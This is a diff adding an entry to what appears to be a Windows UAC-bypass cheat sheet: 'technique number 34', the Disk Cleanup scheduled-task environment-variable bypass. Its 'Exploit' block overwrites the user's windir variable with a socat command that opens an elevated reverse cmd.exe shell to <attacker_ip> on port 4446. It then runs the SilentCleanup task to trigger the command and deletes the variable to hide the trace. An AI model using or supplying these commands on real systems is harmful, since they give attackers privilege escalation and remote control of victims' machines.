@@ -656,3 +656,27 @@ reg delete "HKCU\Software\Classes\ms-settings\" /f
 
 ```
 
+## technique number 34: Disk Cleanup Scheduled Task
+```
+Author: James Forshaw
+
+    Type: Shell API
+    Method: Environment variables expansion
+    Target(s): \system32\svchost.exe via \system32\schtasks.exe
+    Component(s): Attacker defined
+    Implementation: ucmDiskCleanupEnvironmentVariable
+    Works from: Windows 8.1 (9600)
+    AlwaysNotify compatible
+    Fixed in: Windows 10 (silent ninja patch, presumable May 2023 security bulletin)
+        How: Shell API / Windows components update
+
+```
+
+### Exploit
+```powershell
+# cmd
+reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c C:\tools\socat\socat.exe TCP:<attacker_ip>:4446 EXEC:cmd.exe,pipes &REM " /f
+schtasks /run  /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
+reg delete "HKCU\Environment" /v "windir" /f
+
+```
